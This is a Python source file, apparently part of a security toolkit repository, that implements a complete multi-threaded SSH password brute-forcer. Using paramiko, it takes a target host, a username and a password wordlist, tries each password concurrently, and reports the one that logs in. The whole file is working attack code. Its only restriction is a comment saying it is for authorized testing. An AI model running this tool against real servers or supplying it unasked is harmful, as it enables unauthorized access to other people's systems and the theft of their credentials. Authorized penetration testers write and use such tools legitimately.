import paramiko
import argparse
import sys
import socket
from concurrent.futures import ThreadPoolExecutor
from colorama import init
from utils import print_status, load_wordlist

init(autoreset=True)

# ─────────────────────────────────────────────────────────────────
# py-security-toolkit | ssh_bruter.py
# Author : skytech45
# Desc   : A multi-threaded SSH brute-forcer for authorized testing.
# ─────────────────────────────────────────────────────────────────

def attempt_ssh(hostname: str, username: str, password: str, port: int = 22) -> bool:
    """
    Attempt to connect to an SSH server with a single credential set.
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        client.connect(hostname, port=port, username=username, password=password, timeout=5, look_for_keys=False, allow_agent=False)
        return True
    except paramiko.AuthenticationException:
        return False
    except (paramiko.SSHException, socket.error, socket.timeout):
        return None # Connection error
    finally:
        client.close()

def main():
    parser = argparse.ArgumentParser(
        description="A multi-threaded SSH brute-forcer for authorized testing.",
        epilog="Example: python ssh_bruter.py -t 192.168.1.1 -u admin -w wordlists/common_passwords.txt"
    )
    parser.add_argument("-t", "--target", required=True, help="Target hostname or IP address")
    parser.add_argument("-u", "--user", required=True, help="Username to test")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to password wordlist")
    parser.add_argument("-p", "--port", type=int, default=22, help="SSH port (default: 22)")
    parser.add_argument("-th", "--threads", type=int, default=5, help="Number of concurrent threads (default: 5)")
    
    args = parser.parse_args()

    passwords = load_wordlist(args.wordlist)
    if not passwords:
        sys.exit(1)

    print_status(f"Starting SSH brute-force on {args.target}:{args.port} for user '{args.user}'", "cyan")
    print_status(f"Testing {len(passwords)} passwords with {args.threads} threads.", "cyan")
    print("-" * 60)

    found_password = None
    
    def worker(password):
        nonlocal found_password
        if found_password:
            return
        
        result = attempt_ssh(args.target, args.user, password, args.port)
        if result is True:
            found_password = password
            print_status(f"SUCCESS: Found password for '{args.user}': {password}", "success")
        elif result is None:
            # We don't print connection errors for every attempt to avoid spam, 
            # but maybe a warning if the first one fails.
            pass

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        executor.map(worker, passwords)

    print("-" * 60)
    if found_password:
        print_status(f"Brute-force complete. Password found: {found_password}", "success")
    else:
        print_status("Brute-force complete. No password found.", "warning")

if __name__ == "__main__":
    main()
